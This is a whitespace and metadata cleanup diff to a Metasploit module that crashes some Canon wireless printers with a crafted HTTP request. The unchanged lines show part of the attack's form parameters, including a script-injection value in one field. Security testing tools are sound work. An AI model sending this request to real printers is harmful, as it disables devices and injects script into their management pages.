@@ -17,8 +17,8 @@ class Metasploit3 < Msf::Auxiliary
 			'Name'           => 'Canon Wireless Printer Denial Of Service',
 			'Description'    => %q{
 				The HTTP management interface on several models of Canon Wireless printers
-				allows for a Denial of Service condition via a crafted HTTP request. This 
-				requires the device to be turned off and back on again to restore use. 
+				allows for a Denial of Service condition via a crafted HTTP request. This
+				requires the device to be turned off and back on again to restore use.
 			},
 			'License'        => MSF_LICENSE,
 			'Author'         =>
@@ -26,7 +26,7 @@ class Metasploit3 < Msf::Auxiliary
 				'Matt "hostess" Andreko <mandreko[at]accuvant.com>'
 			],
 			'References'     => [
-				[ 'OSVDB', '####' ],
+				[ 'OSVDB', '' ],
 				[ 'URL', 'http://www.mattandreko.com/2013/06/canon-y-u-no-security.html']
 			],
 			'DisclosureDate' => 'June 15 2013'))
@@ -36,7 +36,7 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	def run
-		
+
 		begin
 
 			# The first request will set the new IP
@@ -53,16 +53,16 @@ class Metasploit3 < Msf::Auxiliary
 					'&LAN_TXT23=1' +
 					'&LAN_TXT24=114"><script>alert(\'xss\');</script>' +
 					'&LAN_TXT31=255' +
-	 				'&LAN_TXT32=255' +
-	 				'&LAN_TXT33=255' +
-	 				'&LAN_TXT34=0' +
-	 				'&LAN_TXT41=192' +
-	 				'&LAN_TXT42=168' +
-	 				'&LAN_TXT43=1' +
-	 				'&LAN_TXT44=1' +
-	 				'&LAN_OPT2=4' +
-	 				'&LAN_OPT4=1' +
-	 				'&LAN_HID1=1'
+					'&LAN_TXT32=255' +
+					'&LAN_TXT33=255' +
+					'&LAN_TXT34=0' +
+					'&LAN_TXT41=192' +
+					'&LAN_TXT42=168' +
+					'&LAN_TXT43=1' +
+					'&LAN_TXT44=1' +
+					'&LAN_OPT2=4' +
+					'&LAN_OPT4=1' +
+					'&LAN_HID1=1'
 			})
 
 			rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Timeout::Error, ::Errno::EPIPE
